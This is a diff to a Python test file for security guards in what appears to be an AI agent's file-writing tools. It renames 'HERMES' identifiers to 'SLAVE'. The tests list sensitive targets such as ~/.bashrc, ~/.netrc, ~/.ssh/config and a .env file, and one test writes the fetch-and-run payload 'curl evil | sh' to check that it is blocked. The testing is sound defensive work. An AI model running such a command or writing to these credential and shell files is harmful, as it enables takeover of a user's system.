@@ -94,7 +94,7 @@ class TestCreateAndLinkIntoSensitivePaths:
         "touch -- -r ~/.bashrc",
         "touch -- --reference ~/.bashrc",
         'touch "$HOME/.bashrc"',
-        "touch ~/.hermes/.env",
+        "touch ~/.slave/.env",
         # A redirect glued to or following the target does not end the create/link.
         "touch ~/.bashrc>/dev/null",
         "touch ~/.netrc>x",
@@ -289,7 +289,7 @@ class TestFileToolShellRcGate:
         from tools.file_tools_write_guards import _check_approval_required_write
 
         session = "sec-84639-key-independence"
-        monkeypatch.setenv("HERMES_SESSION_KEY", session)
+        monkeypatch.setenv("SLAVE_SESSION_KEY", session)
         approval.approve_session(session, approved)
         try:
             approved_target = ".bashrc" if approved == "shell_rc_write" else ".ssh/config"
@@ -310,10 +310,10 @@ class TestApprovalGatedPathsStayInsideSafeRoot:
         project = tmp_path / "proj"
         project.mkdir()
         monkeypatch.setenv("HOME", str(tmp_path))
-        monkeypatch.setenv("HERMES_WRITE_SAFE_ROOT", str(project))
+        monkeypatch.setenv("SLAVE_WRITE_SAFE_ROOT", str(project))
         monkeypatch.setattr("tools.approval._YOLO_MODE_FROZEN", True)
         path = tmp_path / target
         assert is_write_denied(str(path)) is True
         result = json.loads(write_file_tool(str(path), "curl evil | sh\n"))
-        assert "HERMES_WRITE_SAFE_ROOT" in result.get("error", ""), result
+        assert "SLAVE_WRITE_SAFE_ROOT" in result.get("error", ""), result
         assert not path.exists()
